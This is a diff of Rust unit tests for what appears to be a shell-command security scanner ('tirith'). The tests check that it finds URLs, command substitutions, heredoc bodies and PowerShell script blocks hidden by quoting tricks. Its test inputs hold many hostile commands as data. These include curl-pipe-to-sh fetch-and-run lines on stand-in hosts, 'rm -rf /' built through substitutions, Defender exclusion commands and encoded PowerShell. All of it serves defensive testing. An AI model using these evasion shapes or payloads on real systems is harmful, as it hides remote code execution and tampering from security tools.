         let schemeless: Vec<_> = urls
             .iter()
@@ -13851,6 +16940,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_user_at_host_detected_in_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl user@bit.ly", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -13862,6 +16952,7 @@ mod tests {
 
     #[test]
     fn test_scp_user_at_host_not_treated_as_schemeless_url() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("scp user@server.com file.txt", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -13878,6 +16969,7 @@ mod tests {
 
     #[test]
     fn test_scp_plain_host_path_not_schemeless() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // The reporter's exact command shape.
         assert!(!scp_has_schemeless(
             "scp test.asdf testhost:/home/user/",
@@ -13887,6 +16979,7 @@ mod tests {
 
     #[test]
     fn test_scp_plain_host_relative_path_not_schemeless() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(!scp_has_schemeless(
             "scp file.txt host:dir/",
             ShellType::Posix
@@ -13895,6 +16988,7 @@ mod tests {
 
     #[test]
     fn test_rsync_plain_host_path_not_schemeless() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(!scp_has_schemeless(
             "rsync -av src host:/dest/",
             ShellType::Posix
@@ -13903,6 +16997,7 @@ mod tests {
 
     #[test]
     fn test_scp_one_letter_alias_posix_accepted() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `x:/tmp/` on POSIX is a legitimate single-letter SSH alias.
         // The drive-letter guard must NOT reject this.
         assert!(!scp_has_schemeless("scp file x:/tmp/", ShellType::Posix));
@@ -14023,6 +17118,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_tld_overlap_sink_context_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // In a real sink context, evil.zip/payload should be detected as schemeless URL.
         let urls = extract_urls("curl evil.zip/payload", ShellType::Posix);
         let schemeless: Vec<_> = urls
@@ -14037,6 +17133,7 @@ mod tests {
 
     #[test]
     fn shell_effective_spelling_reaches_tier3_and_sink_resolution() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"c"ur"l EVIL.EXAMPLE:8443/payload"#;
         assert!(tier1_scan_for_shell(
             input,
@@ -14053,6 +17150,7 @@ mod tests {
 
     #[test]
     fn full_url_schemes_are_case_insensitive_after_shell_normalization() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(r#"curl HT"TP://EVIL.EXAMPLE"/payload"#, ShellType::Posix);
         assert!(urls.iter().any(|url| {
             url.parsed.scheme() == Some("http") && url.parsed.host() == Some("evil.example")
@@ -14061,6 +17159,7 @@ mod tests {
 
     #[test]
     fn schemeless_structural_parser_covers_ports_ips_queries_and_fragments() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (destination, expected_host) in [
             ("evil.example:8443/a", "evil.example"),
             ("127.0.0.1:8080/a", "127.0.0.1"),
@@ -14084,6 +17183,7 @@ mod tests {
 
     #[test]
     fn schemeless_structural_parser_keeps_file_controls() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(extract_urls("curl README.md", ShellType::Posix).is_empty());
         assert!(
             extract_urls("curl -o archive.zip example.com", ShellType::Posix)
@@ -14115,6 +17215,7 @@ mod tests {
 
     #[test]
     fn package_registry_specs_are_not_schemeless_urls_but_artifact_urls_remain_visible() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "npm install eslint.config@^1",
             "npm i @scope/eslint.config@latest",
@@ -14183,6 +17284,7 @@ mod tests {
 
     #[test]
     fn docker_pull_value_and_unknown_options_cannot_hide_the_real_image() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let known = extract_urls(
             "docker run --pull always attacker.example/ns/image:1",
             ShellType::Posix,
@@ -14230,6 +17332,7 @@ mod tests {
 
     #[test]
     fn inspection_carveout_only_skips_proven_literal_arguments() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let literal = r#"tirith diff '$(curl https://literal.example)'"#;
         assert!(tirith_inert_arg_range(literal, ShellType::Posix).is_some());
         assert!(extract_urls(literal, ShellType::Posix).is_empty());
@@ -14254,6 +17357,7 @@ mod tests {
 
     #[test]
     fn nested_substitutions_keep_single_quotes_literal_inside_double_quotes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"tirith diff "it's $(curl https://quote-state.example/payload)""#;
         for shell in [ShellType::Posix, ShellType::PowerShell] {
             let bodies = executable_substitutions(input, shell);
@@ -14272,6 +17376,7 @@ mod tests {
 
     #[test]
     fn executable_body_preflight_ignores_quoted_data_but_caps_real_substitutions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let delimiter_data = ";;&|(){}<>`".repeat(128);
         for (input, shell) in [
             (format!("rg '{delimiter_data}' README.md"), ShellType::Posix),
@@ -14325,6 +17430,7 @@ mod tests {
 
     #[test]
     fn substitution_close_ignores_commented_parens_and_resumes_after_newline() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for shell in [ShellType::Posix, ShellType::PowerShell] {
             let input =
                 "tirith diff \"$(echo safe # )\ncurl https://comment-close.example/payload)\"";
@@ -14347,8 +17453,205 @@ mod tests {
         }
     }
 
+    /// Inside an unquoted `${...}` a word-start `#` is part of the parameter
+    /// word, so the substitution after it runs (bash, dash, zsh and ksh run
+    /// it). The scan read the `#` as a comment and skipped the rest of the
+    /// line. A comment inside a `$(...)` within `${...}` is still a comment.
+    #[test]
+    fn hash_inside_a_parameter_expansion_starts_no_comment() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://hash-in-parameter.example/i.sh | sh";
+        for input in [
+            format!("echo ${{x:- #}} $({payload})"),
+            format!("x=\necho ${{x:-a #b}} `{payload}`"),
+            format!("echo ${{x:- #'}}'}} $({payload})"),
+            format!("echo ${{x:-${{y:- #}}}} $({payload})"),
+        ] {
+            let bodies = executable_substitutions(&input, ShellType::Posix);
+            assert!(
+                bodies.iter().any(|body| body.contains(payload)),
+                "{input:?} -> {bodies:?}"
+            );
+        }
+        for input in [
+            format!("echo ${{x:-$(true # $({payload})\n)}}"),
+            format!("echo hi # ${{x:- $({payload})}}"),
+            format!("echo ${{x:-'# $({payload})'}}"),
+        ] {
+            let bodies = executable_substitutions(&input, ShellType::Posix);
+            assert!(
+                !bodies.iter().any(|body| body.trim() == payload),
+                "{input:?} -> {bodies:?}"
+            );
+        }
+    }
+
+    /// Where bash, dash, ksh and zsh end a `$${...}` word in different
+    /// places, or a backslash-newline splits `$(`, `${`, `<(` or `>(` (which
+    /// the scan reads only when the two bytes touch), the scan fails closed.
+    /// Outside `${...}`, `$$` opens no `${`: the `#` after `$${x` starts a
+    /// comment, and a later substitution is found.
+    #[test]
+    fn dollar_runs_and_split_expansions_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://dollar-run.example/i.sh | sh";
+        let missed = [
+            format!("echo $${{x # it's\necho a}}b\n{payload}\n# '}}"),
+            format!("echo $${{x ; {payload}"),
+            format!("echo ${{x:-$${{y}}\n{payload}\n: }}"),
+            format!("echo ${{x:-$$(echo }}) #}} ; {payload}"),
+            format!("echo $\\\n({payload})"),
+            format!("echo $\\\n{{x:- #}} ; {payload}"),
+            format!("echo \"$\\\n({payload})\""),
+            format!("cat <\\\n({payload})"),
+        ]
+        .into_iter()
+        .filter(|input| {
+            executable_substitution_scan(input, ShellType::Posix).gap
+                != Some(ShellExecutionGap::AmbiguousExecutableBody)
+        })
+        .collect::<Vec<_>>();
+        assert!(missed.is_empty(), "{missed:#?}");
+
+        let input = format!("echo $${{x # it's\necho a}}b\necho $({payload})\n# '}}");
+        let bodies = executable_substitutions(&input, ShellType::Posix);
+        assert!(
+            bodies.iter().any(|body| body.contains(payload)),
+            "{bodies:?}"
+        );
+
+        for input in [
+            "echo $${HOME}",
+            "echo $$ $${HOME} $$",
+            "echo $$${HOME:-x}",
+            "echo \\$${HOME:-x}",
+            "echo a >\\\nfile",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input:?}");
+        }
+    }
+
+    /// bash, zsh and ksh read `$'a\''` as one ANSI-C string; dash (and this
+    /// scan and the tokenizer) read a `$`, the string `'a\'` and an opening
+    /// quote. A command after it is then quoted text in one reading and runs
+    /// in the other (`echo $'a\'' ; cmd # '` runs `cmd` in bash only), so
+    /// the scan fails closed on a `$'...'` string holding a `\'`, or, in a
+    /// backtick body, a `\\` right before its closing quote (the shells
+    /// unescape the body to `\'` first).
+    #[test]
+    fn ansi_c_strings_the_shells_end_differently_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://ansi-c.example/i.sh | sh";
+        let missed = [
+            format!("echo $'a\\'' ; {payload} # '"),
+            format!("echo $'a\\''\n{payload}\n# '"),
+            format!("echo ${{x:-$'a\\''}} ; {payload} # '"),
+            format!("echo $'a\\'b\\'c' ; {payload}"),
+            format!("echo $\\\n'a\\'' ; {payload} # '"),
+            format!("echo `echo $'a\\\\'' ; {payload} # '`"),
+            format!("echo \"`echo $'a\\\\'' ; {payload} # '`\""),
+        ]
+        .into_iter()
+        .filter(|input| {
+            executable_substitution_scan(input, ShellType::Posix)
+                .gap
+                .is_none()
+        })
+        .collect::<Vec<_>>();
+        assert!(missed.is_empty(), "{missed:#?}");
+
+        // Read the same way in every shell.
+        for input in [
+            "IFS=$'\\n\\t'",
+            "printf $'done\\t%s\\n' ok",
+            "echo $'it''s'",
+            "echo $'a\\\\'",
+            "echo $$'a'",
+            "echo 'cost: $'\\''5'",
+            "echo \"$'a\\'\"",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input:?}");
+        }
+    }
+
+    /// In double quotes the shells read a `$(...)` body as code, so a heredoc
+    /// opened there (`git commit -m "$(cat <<'EOF'`) has data lines for its
+    /// body. The header reader took the `<<` for double-quoted text, so the
+    /// body stayed in the execution view, where an apostrophe in it opened a
+    /// quote that hid the command after the closing `)"`.
+    #[test]
+    fn heredoc_in_double_quoted_substitution_is_a_heredoc() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://dq-heredoc.example/i.sh | sh";
+        for (input, body) in [
+            (
+                format!("x=\"$(cat <<'EOF'\nit's\nEOF\n)\"; {payload}"),
+                "it's\n",
+            ),
+            (
+                format!("git commit -m \"$(cat <<'EOF'\nfix: don't crash\nEOF\n)\" && {payload}"),
+                "fix: don't crash\n",
+            ),
+            (
+                format!("x=\"$(cat <<-'EOF'\n\tit's\n\tEOF\n)\"; {payload}"),
+                "\tit's\n",
+            ),
+            (
+                format!("x=\"$(cat <<EOF\nsay \"hi\nEOF\n)\"; {payload}"),
+                "say \"hi\n",
+            ),
+            (
+                format!("x=\"$(echo \"$(cat <<'EOF'\nit's\nEOF\n)\")\"; {payload}"),
+                "it's\n",
+            ),
+            (
+                format!("x=\"$( (cat <<'EOF'\nit's\nEOF\n) )\"; {payload}"),
+                "it's\n",
+            ),
+            (
+                format!("x=\"$(\n  cat <<'EOF'\nit's\nEOF\n)\"\n{payload}"),
+                "it's\n",
+            ),
+        ] {
+            let spans = posix_heredoc_spans(&input).unwrap_or_else(|| panic!("{input:?}"));
+            assert_eq!(spans.len(), 1, "{input:?}");
+            assert_eq!(&input[spans[0].body.clone()], body, "{input:?}");
+            let view = shell_execution_view(&input, ShellType::Posix);
+            assert!(!view.contains(body.trim()), "{view:?}");
+            let segments = tokenize::tokenize(&view, ShellType::Posix);
+            assert!(
+                segments
+                    .iter()
+                    .any(|segment| segment.command.as_deref() == Some("curl")),
+                "{input:?} -> {segments:?}"
+            );
+        }
+
+        // `$$(` is the PID and a plain `(` in double quotes: no heredoc.
+        let input = "x=\"$$(cat <<'EOF'\nit's\nEOF\n)\"";
+        assert_eq!(posix_heredoc_spans(input), Some(Vec::new()));
+
+        // A heredoc that a shell reads inside the substitution is still
+        // recovered as code.
+        for input in [
+            format!("x=\"$(sh <<'EOF'\n{payload}\nEOF\n)\""),
+            format!("echo \"$(bash -s <<'EOF'\necho hi\n{payload}\nEOF\n)\""),
+            format!("x=$(bash <<'EOF'\n{payload}\nEOF\n)"),
+            format!("x=\"$(echo `sh <<'EOF'\n{payload}\nEOF\n`)\""),
+        ] {
+            let bodies = executable_substitutions(&input, ShellType::Posix);
+            assert!(
+                bodies.iter().any(|body| body.contains(payload)),
+                "{input:?} -> {bodies:?}"
+            );
+        }
+    }
+
     #[test]
     fn powershell_only_recovers_scriptblocks_in_executable_contexts() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$block = { Add-MpPreference -ExclusionPath C:\\Temp }",
             "Write-Output '{ Add-MpPreference -ExclusionPath C:\\Temp }'",
@@ -14379,6 +17682,7 @@ mod tests {
 
     #[test]
     fn powershell_nested_groups_and_subexpressions_are_recovered_one_level_at_a_time() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let outer = executable_substitution_scan(
             "& { Write-Output $(& { Add-MpPreference -ExclusionPath C:\\Temp }) }",
             ShellType::PowerShell,
@@ -14397,6 +17701,7 @@ mod tests {
 
     #[test]
     fn powershell_dynamic_or_incomplete_invocation_retains_a_gap() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in ["& $block", "& foo$bar", "& \"foo$bar\""] {
             let dynamic = executable_substitution_scan(input, ShellType::PowerShell);
             assert_eq!(
@@ -14419,6 +17724,7 @@ mod tests {
 
     #[test]
     fn literal_shell_wrapper_bodies_preserve_the_child_shell() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, outer_shell, child_shell, expected) in [
             (
                 "sh -c 'npm install known-bad'",
@@ -14470,6 +17776,7 @@ mod tests {
 
     #[test]
     fn encoded_powershell_wrapper_body_is_decoded_as_utf16le() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use base64::Engine as _;
 
         let source = "Add-MpPreference -ExclusionPath C:\\Temp";
@@ -14495,6 +17802,7 @@ mod tests {
 
     #[test]
     fn unicode_parameter_dashes_bind_cross_shell_powershell_command_bodies() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let source = "Add-MpPreference -ExclusionPath C:\\Temp";
         for dash in ['\u{2013}', '\u{2014}', '\u{2015}'] {
             let input = format!("pwsh {dash}Command '{source}'");
@@ -14517,6 +17825,7 @@ mod tests {
 
     #[test]
     fn dynamic_or_invalid_shell_wrapper_bodies_retain_a_gap() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell, expected) in [
             (
                 r#"sh -c "$COMMAND""#,
@@ -14561,6 +17870,7 @@ mod tests {
 
     #[test]
     fn executable_scan_input_budget_is_exact_and_preserves_prefix_bodies() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let exact = "x".repeat(MAX_EXECUTABLE_SCAN_INPUT_BYTES);
         let exact_scan = executable_substitution_scan(&exact, ShellType::Posix);
         assert!(
@@ -14593,6 +17903,7 @@ mod tests {
 
     #[test]
     fn executable_scan_candidate_budget_is_exact_and_fails_closed_at_plus_one() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let exact = "true;".repeat(MAX_EXECUTABLE_SCAN_CANDIDATES);
         let exact_scan = executable_substitution_scan(&exact, ShellType::Posix);
         assert!(
@@ -14611,6 +17922,7 @@ mod tests {
 
     #[test]
     fn executable_scan_body_budget_keeps_the_exact_prefix_and_marks_omission() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let body_input = |count: usize| {
             let mut input = String::from("echo ");
             for spaces in 1..=count {
@@ -14645,6 +17957,7 @@ mod tests {
 
     #[test]
     fn derived_or_unparsed_posix_command_bodies_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$(printf rm) -rf /",
             "${UNSET:-rm} -rf /",
@@ -14663,6 +17976,7 @@ mod tests {
 
     #[test]
     fn bounded_heredocs_preserve_literal_data_and_recover_executable_input() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let arithmetic = executable_substitution_scan("echo $((1 << 2))", ShellType::Posix);
         assert!(arithmetic.gap.is_none(), "{arithmetic:?}");
 
@@ -14728,8 +18042,519 @@ mod tests {
         );
     }
 
+    /// Reserved words, groups and compound commands around a heredoc's
+    /// reader, as bash, dash, zsh and ksh read them.
+    #[test]
+    fn heredoc_readers_read_through_reserved_words_and_compound_commands() {
+        let read = |header: &str| {
+            let recovery = recover_posix_heredocs(&format!("{header}\necho body\nEOF"));
+            let code = recovery
+                .bodies
+                .iter()
+                .any(|body| body.input.trim() == "echo body");
+            (code, recovery.gap)
+        };
+        for header in [
+            "if true; then sh <<'EOF'; fi",
+            "if false; then :; elif true; then sh <<'EOF'; fi",
+            "if sh <<'EOF'; then :; fi",
+            "! sh <<'EOF'",
+            "{ sh <<'EOF'; }",
+            "{ <<'EOF' sh; }",
+            "while true; do sh <<'EOF'; done",
+            "case x in x) sh <<'EOF';; esac",
+            "case x in (x) sh <<'EOF';; esac",
+            "case $(uname) in Linux) sh <<'EOF';; esac",
+            "case \"$v\" in a|b) sh <<'EOF';; esac",
+            "true; { sh; } <<'EOF'",
+            "if true; then sh; fi <<'EOF'",
+            "if true; then { sh; } <<'EOF'; fi",
+            "( sh ) <<'EOF'",
+            "(cd /tmp && sh) <<'EOF'",
+            "for i in 1; do sh; done <<'EOF'",
+            "case x in x) sh;; esac <<'EOF'",
+            "{ { true; }; sh; } <<'EOF'",
+            "{ sh 0<&3; } 3<<'EOF'",
+            "{ sh; } 3<<'EOF' 0<&3",
+            "while read l; do\n  sh\ndone <<'EOF'",
+            "if true; then\n  if false; then :; fi\n  sh\nfi <<'EOF'",
+            "case x in\n  x) sh;;\nesac <<'EOF'",
+            "{\n  sh\n} <<'EOF'",
+            "<<'EOF' { sh; }",
+            "<<'EOF' if true; then sh; fi",
+        ] {
+            assert!(read(header).0, "{header}: {:?}", read(header));
+        }
+        for header in [
+            "{ cat; } <<'EOF'",
+            "if true; then cat; fi <<'EOF'",
+            "if true; then cat <<'EOF'; fi",
+            "while read l; do echo \"$l\"; done <<'EOF'",
+            "( cat ) <<'EOF'",
+            "while read l; do\n  echo \"$l\"\ndone <<'EOF'",
+            "case x in x) cat <<'EOF';; esac",
+        ] {
+            assert_eq!(read(header), (false, None), "{header}");
+        }
+        // No compound command to close, or one nested past the bound.
+        let deep = format!(
+            "{}cat <<'EOF'{}",
+            "{ ".repeat(MAX_HEREDOC_READER_DEPTH + 1),
+            "; }".repeat(MAX_HEREDOC_READER_DEPTH + 1)
+        );
+        for header in ["done <<'EOF'", "true; fi <<'EOF'", deep.as_str()] {
+            assert_eq!(
+                read(header),
+                (false, Some(ShellExecutionGap::AmbiguousExecutableBody)),
+                "{header}"
+            );
+        }
+        // Past the work bound a group's readers are unknown: the header (the
+        // operator masked to blanks) is read, its group body is not.
+        let header = "{ sh; }         ";
+        let mut work = header.len() + 1;
+        let mut cx = HeredocReadContext {
+            fd: "0",
+            work: &mut work,
+        };
+        assert_eq!(
+            heredoc_reader(header, 8, 15, MAX_HEREDOC_READER_DEPTH, &mut cx),
+            Some(HeredocReading::AMBIGUOUS)
+        );
+        let mut work = MAX_HEREDOC_READER_WORK_BYTES;
+        let mut cx = HeredocReadContext {
+            fd: "0",
+            work: &mut work,
+        };
+        assert_eq!(
+            heredoc_reader(header, 8, 15, MAX_HEREDOC_READER_DEPTH, &mut cx),
+            Some(HeredocReading::shell(ShellType::Posix))
+        );
+    }
+
+    /// A subshell opened on an earlier line holds the heredoc on the line of
+    /// its `)` (`(` + newline + `sh` + newline + `) <<'EOF'`, `sh ) <<'EOF'`,
+    /// `sh <<'EOF' )`): the whole program is read for it. A case subject or
+    /// pattern holding `$(...)` or `${...}` with blanks or operators is one
+    /// word, and a pattern list runs up to its `)` however it is spaced
+    /// (`x | y )`, `x )`, `x)sh`). bash 3.2 and 5, sh, dash, zsh and ksh run
+    /// the body of every code shape below and none of the data shapes. (The
+    /// tokenizer splits at a `|` in a backtick body, so a backtick subject
+    /// such as `` `echo x | cat` `` is not read here; its unresolved command
+    /// word fails closed, see the golden fixtures.)
+    #[test]
+    fn heredoc_readers_read_subshells_closed_later_and_whole_case_words() {
+        let read = |header: &str, tail: &str| {
+            let recovery = recover_posix_heredocs(&format!("{header}\necho body\nEOF\n{tail}"));
+            let code = recovery
+                .bodies
+                .iter()
+                .any(|body| body.input.trim() == "echo body");
+            (code, recovery.gap)
+        };
+        for (header, tail) in [
+            ("(\n  sh\n) <<'EOF'", ""),
+            ("(cd /tmp\n  sh\n) <<'EOF'", ""),
+            ("( true\nsh ) <<'EOF'", ""),
+            ("( true\nsh; ) <<'EOF'", ""),
+            ("if true; then (\n  sh\n) <<'EOF'", "fi"),
+            ("true && (\n  sh\n) <<'EOF'", ""),
+            ("x=1; (\n  sh\n) <<'EOF'", ""),
+            ("(\n  sh\n) 2>/dev/null <<'EOF'", ""),
+            ("(\n  sh\n) 3<<'EOF' 0<&3", ""),
+            ("(\n  sh\n)<<'EOF'", ""),
+            ("(\n  sh\n) <<'EOF' | cat", ""),
+            ("(\n  (\n    sh\n  )\n) <<'EOF'", ""),
+            ("( (\n  sh\n) ) <<'EOF'", ""),
+            ("while true; do (\n  sh\n) <<'EOF'", "break; done"),
+            ("( true\nsh <<'EOF' )", ""),
+            ("( true\nsh <<'EOF')", ""),
+            ("( true\n<<'EOF' sh )", ""),
+            ("( sh\ncat /dev/null ) <<'EOF'", ""),
+            ("( sh\necho a b ) <<'EOF'", ""),
+            // A `)` with no group to close is a syntax error; the command
+            // before it is still read as one.
+            ("bash -s ) <<'EOF'", ""),
+            ("<<'EOF' | sh", ""),
+            ("true; <<'EOF' | sh", ""),
+            ("case $(echo x |\n  cat) in x) sh <<'EOF';; esac", ""),
+            ("case $(echo x | cat) in x) sh <<'EOF';; esac", ""),
+            ("case $(true; echo x) in x) sh <<'EOF';; esac", ""),
+            ("case $(true && echo x) in x) sh <<'EOF';; esac", ""),
+            ("case ${v%;*} in x) sh <<'EOF';; esac", ""),
+            (
+                "case $(uname -s | tr A-Z a-z) in linux) sh <<'EOF';; esac",
+                "",
+            ),
+            (
+                "case $(uname -s | tr A-Z a-z) in linux) sh;; esac <<'EOF'",
+                "",
+            ),
+            ("case $((1 < 2)) in 1) sh <<'EOF';; esac", ""),
+            ("case $(echo \"a b\" | cat) in x) sh <<'EOF';; esac", ""),
+            ("case $(echo ')' | cat) in x) sh <<'EOF';; esac", ""),
+            ("case $(echo x | cat)y in xy) sh <<'EOF';; esac", ""),
+            ("case x in x | y ) sh <<'EOF';; esac", ""),
+            ("case x in x|y ) sh <<'EOF';; esac", ""),
+            ("case x in (x | y) sh <<'EOF';; esac", ""),
+            ("case x in y) :;; x ) sh <<'EOF';; esac", ""),
+            ("case x in y) :;; x | z ) sh <<'EOF';; esac", ""),
+            ("case x in x)sh <<'EOF';; esac", ""),
+            ("case x in x )sh <<'EOF';; esac", ""),
+            ("case x in y) :;; $(echo x)) sh <<'EOF';; esac", ""),
+        ] {
+            assert!(read(header, tail).0, "{header}: {:?}", read(header, tail));
+        }
+        for (header, tail) in [
+            ("(\n  cat\n) <<'EOF'", ""),
+            ("( true\ncat ) <<'EOF'", ""),
+            ("(\n  sh ./script.sh\n) <<'EOF'", ""),
+            ("if true; then (\n  cat\n) <<'EOF'", "fi"),
+            ("( true\ncat <<'EOF' )", ""),
+            ("( true\ncat /dev/null ) <<'EOF'", ""),
+            (
+                "case $(uname -s | tr A-Z a-z) in linux) cat <<'EOF';; esac",
+                "",
+            ),
+            (
+                "case $(uname -s | tr A-Z a-z) in linux) cat;; esac <<'EOF'",
+                "",
+            ),
+            ("case ${v%;*} in x) cat <<'EOF';; esac", ""),
+            ("case x in y) :;; x | z ) cat <<'EOF';; esac", ""),
+            ("case x in x) <<'EOF';; esac", ""),
+            ("case x in\n  x) <<'EOF'", "  ;;\nesac"),
+            ("x=$(\n  cat <<'EOF'", ")"),
+            ("true\n<<'EOF'", "sh"),
+        ] {
+            assert_eq!(read(header, tail), (false, None), "{header}");
+        }
+        // Nesting has no bound of its own (the tokenizer has none): a deep
+        // but closed subject is one word, as it was when no blank split it.
+        let deep = format!(
+            "case {}x{} in x) sh <<'EOF';; esac",
+            "$(".repeat(200),
+            ")".repeat(200)
+        );
+        assert!(read(&deep, "").0, "{deep}");
+        let deep_word = format!("{}x{} in", "$(".repeat(200), ")".repeat(200));
+        assert_eq!(
+            posix_lead_word(deep_word.as_bytes(), 0, deep_word.len()),
+            PosixLeadWordEnd {
+                end: deep_word.len() - " in".len(),
+                unopened_close: false
+            }
+        );
+
+        // The word reader keeps the tokenizer's scopes in one word and stops
+        // after a `)` that closes nothing opened in the word.
+        for (text, word, unopened_close) in [
+            (
+                "$(uname -s | tr A-Z a-z) in",
+                "$(uname -s | tr A-Z a-z)",
+                false,
+            ),
+            ("${v%;*} in", "${v%;*}", false),
+            ("$((1 < 2)) in", "$((1 < 2))", false),
+            ("`echo x | cat` in", "`echo x | cat`", false),
+            (
+                "\"$(echo \")\" | cat)\" x",
+                "\"$(echo \")\" | cat)\"",
+                false,
+            ),
+            ("$(echo ')' | cat)y in", "$(echo ')' | cat)y", false),
+            ("${x:-(} y", "${x:-(}", false),
+            ("${x:-)} y", "${x:-)}", false),
+            ("$(echo # )\n) y", "$(echo # )\n)", false),
+            ("`echo $(x` y", "`echo $(x`", false),
+            ("\"$$(\" x", "\"$$(\"", false),
+            ("$(unclosed | x", "$(unclosed | x", false),
+            ("x)sh", "x)", true),
+            ("$(echo x)) sh", "$(echo x))", true),
+            (")", ")", true),
+            ("f() {", "f()", false),
+            ("arr=(a b) sh", "arr=(a b)", false),
+            ("a;b", "a", false),
+            ("'a b' c", "'a b'", false),
+        ] {
+            assert_eq!(
+                posix_lead_word(text.as_bytes(), 0, text.len()),
+                PosixLeadWordEnd {
+                    end: word.len(),
+                    unopened_close
+                },
+                "{text:?}"
+            );
+        }
+
+        // A newline separates commands like `;`: the operator (masked to
+        // blanks) at the start of a line is read with the command after it
+        // (`<<'EOF' sh`). zsh also pipes a lone heredoc into the next command
+        // through $READNULLCMD (`<<'EOF' | sh` runs the body there).
+        for (line, operator, holder) in [
+            ("true\n        sh", 5, 1),
+            ("true;        sh", 5, 1),
+            ("        | sh", 0, 0),
+            ("true;         | sh", 5, 1),
+            ("sh        ; true", 3, 0),
+        ] {
+            let segments = tokenize::tokenize(line, ShellType::Posix);
+            assert_eq!(
+                heredoc_operator_segment(line, &segments, operator),
+                Some(holder),
+                "{line:?}"
+            );
+        }
+    }
+
+    /// The terminator line is the delimiter word after quote removal, as the
+    /// shell does it. Inside double quotes a backslash is removed only before
+    /// `$`, `` ` ``, `"` and `\`: bash, dash, zsh and ksh93 all end
+    /// `<<"E\OF"` at the line `E\OF`. Reading `EOF` instead hid the commands
+    /// after `E\OF` as heredoc data.
+    #[test]
+    fn heredoc_delimiter_quote_removal_matches_the_shell() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://example.com/i.sh | sh";
+        for (delimiter, terminator) in [
+            (r#""E\OF""#, r"E\OF"),
+            (r#""E\ F""#, r"E\ F"),
+            (r#""E\'F""#, r"E\'F"),
+            (r#""E\nF""#, r"E\nF"),
+            (r#""E\$F""#, "E$F"),
+            (r#""E\\F""#, r"E\F"),
+            (r#""E\"F""#, r#"E"F"#),
+            ("\"E\\`F\"", "E`F"),
+            (r"E\OF", "EOF"),
+            (r"E\\OF", r"E\OF"),
+            (r"'E\OF'", r"E\OF"),
+            (r#"E"O"F"#, "EOF"),
+            ("$EOF", "$EOF"),
+            (r#""$EOF""#, "$EOF"),
+        ] {
+            // The trailing `EOF` line is what a wrong reading would end at.
+            let input = format!("cat <<{delimiter}\nbody\n{terminator}\n{payload}\nEOF\n");
+            let spans = posix_heredoc_spans(&input).unwrap_or_else(|| panic!("{input:?}"));
+            assert_eq!(spans.len(), 1, "{input:?}");
+            assert_eq!(&input[spans[0].body.clone()], "body\n", "{input:?}");
+            let view = shell_execution_view(&input, ShellType::Posix);
+            assert!(view.contains(payload), "{input:?} -> {view:?}");
+            assert!(!view.contains("body"), "{input:?} -> {view:?}");
+        }
+
+        // `$'...'` and `$"..."` are translated by bash, zsh and ksh but not by
+        // dash, so the terminator depends on the shell: fail closed and leave
+        // every line visible.
+        for input in [
+            format!("cat <<$'EOF'\nbody\nEOF\n{payload}\n$EOF\n"),
+            format!("cat <<$\"EOF\"\nbody\nEOF\n{payload}\n$EOF\n"),
+            format!("cat <<E$'O'F\nbody\nEOF\n{payload}\nE$OF\n"),
+            format!("cat <<$'E\\x4fF'\nbody\nEOF\n{payload}\n$E\\x4fF\n"),
+        ] {
+            assert_eq!(posix_heredoc_spans(&input), None, "{input:?}");
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            assert!(scan.gap.is_some(), "{input:?} -> {scan:?}");
+            let view = shell_execution_view(&input, ShellType::Posix);
+            assert!(view.contains(payload), "{input:?} -> {view:?}");
+        }
+        // Inside double quotes `$'` is literal in every shell.
+        let literal = format!("cat <<\"$'x'\"\nbody\n$'x'\n{payload}\n");
+        let spans = posix_heredoc_spans(&literal).expect("literal $' delimiter");
+        assert_eq!(&literal[spans[0].body.clone()], "body\n");
+
